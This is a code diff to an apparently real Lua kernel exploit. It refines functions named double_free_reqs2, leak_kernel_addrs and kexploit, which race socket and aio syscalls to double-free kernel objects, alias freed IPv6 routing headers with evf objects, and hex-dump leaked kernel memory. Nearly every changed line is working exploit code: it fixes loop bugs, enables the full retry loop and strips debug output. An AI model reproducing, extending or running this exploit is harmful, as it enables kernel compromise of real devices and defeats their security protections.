@@ -737,7 +737,7 @@ function set_rthdr(sd, buf, len)
 end
 
 function free_rthdrs(sds)
-    for sd in pairs(sds) do
+    for _, sd in ipairs(sds) do
         syscall.setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
     end
 end
@@ -836,7 +836,7 @@ function double_free_reqs2(sds)
     for i=1,NUM_RACES do
 
         print()
-        printf("== attempt #%d ==", i)
+        printf("== double free - attempt #%d ==", i)
         print()
 
         local sd_client = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
@@ -937,40 +937,33 @@ function leak_kernel_addrs(sd_pair)
     syscall.close(sd_pair[2])
 
     local evf = nil
-    -- for i=1, NUM_ALIAS do
-    for i=1, 1 do
+    for i=1, NUM_ALIAS do
+
+        print()
+        printf("== evf - attempt #%d ==", i)
+        print()
 
         local evfs = {}
 
         -- reclaim freed rthdr with evf object
         for j=1, NUM_HANDLES do
             local evf_flags = bit32.bor(0xf00, bit32.lshift(j, 16))
-            local evf_id = new_evf(name, evf_flags)
-            -- printf("evf[%d] = %s", j, hex(evf_id))
-            table.insert(evfs, evf_id)
-            -- table.insert(evfs, new_evf(name, evf_flags))
+            table.insert(evfs, new_evf(name, evf_flags))
         end
 
         get_rthdr(sd, buf, 0x80)
 
         -- for simplicty, we'll assume i < 2**16
-        local flag_int = memory.read_dword(buf):tonumber()
-        local idx = bit32.rshift(flag_int, 16) 
-        local expected_flag = bit32.bor(flag_int, 1)
+        local flag = memory.read_dword(buf):tonumber()
+        local idx = bit32.rshift(flag, 16) 
+        local expected_flag = bit32.bor(flag, 1)
         
-        evf = evfs[idx+1]
+        evf = evfs[idx]
 
         set_evf_flags(evf, expected_flag)
         get_rthdr(sd, buf, 0x80)
 
         local val = memory.read_dword(buf):tonumber()
-
-        dbgf("flag_int: %s", hex(flag_int))
-        dbgf("idx: %s", hex(idx))
-        dbgf("expected_flag: %s", hex(expected_flag))
-        dbgf("evf = %s", hex(evf))
-        dbgf("val: %s", hex(val))
-        print("---")
 
         if val == expected_flag then
             table.remove(evfs, idx)
@@ -978,8 +971,8 @@ function leak_kernel_addrs(sd_pair)
             evf = nil
         end
 
-        for j=1, #evfs do
-            free_evf(evfs[j])
+        for _, each_evf in ipairs(evfs) do
+            free_evf(each_evf)
         end
 
         if evf ~= nil then
@@ -992,6 +985,10 @@ function leak_kernel_addrs(sd_pair)
         error("failed to confuse evf and rthdr")
     end
 
+    set_evf_flags(evf, bit32.band(0xff, 8))
+    get_rthdr(sd, buf, 0x80)
+
+    print(memory.hex_dump(buf, 0x80))
 
 end
 
@@ -1062,7 +1059,7 @@ function kexploit()
         aio_multi_delete(block_id, 1)
     end
 
-    for sd in pairs(sds) do
+    for _, sd in ipairs(sds) do
         syscall.close(sd)
     end
 end
